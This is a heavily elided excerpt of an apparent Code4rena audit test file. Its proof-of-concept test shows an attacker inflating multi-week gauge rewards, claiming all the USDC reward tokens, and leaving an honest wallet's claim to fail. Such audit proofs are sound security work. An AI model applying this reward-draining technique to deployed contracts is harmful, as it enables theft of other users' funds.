...
describe("Code4rena Contest", () => {
  ...
  describe("Proof of concepts", () => {
    ...
    it("Inflated multi-week gauge rewards", async () => {
      ...
      const walletEarned1 = await c.clGauge.periodEarned(
        startPeriod,
        c.usdc,
        wallet.address,
        0,
      ...
      const attackerEarned1 = await c.clGauge.periodEarned(
        startPeriod,
        c.usdc,
        attacker.address,
        0,
      ...
      const tokenTotalSupplyByPeriod = await c.clGauge.tokenTotalSupplyByPeriod(
        startPeriod,
        c.usdc,
      );
      ...
      const attackerEarned2 = await c.clGauge.periodEarned(
        startPeriod,
        c.usdc,
        attacker.address,
        0,
      ...
      await c.clGauge
        .connect(attacker)
        .getPeriodReward(startPeriod, [c.usdc], attacker.address, 0, -10, 10, attacker.address);
      ...
      // took all the tokens
      const walletEarned2 = await c.clGauge.periodEarned(
        startPeriod,
        c.usdc,
        wallet.address,
        0,
      ...
      await expect(
        c.clGauge
          .connect(wallet)
          .getPeriodReward(startPeriod, [c.usdc], wallet.address, 0, -10, 10, wallet.address),
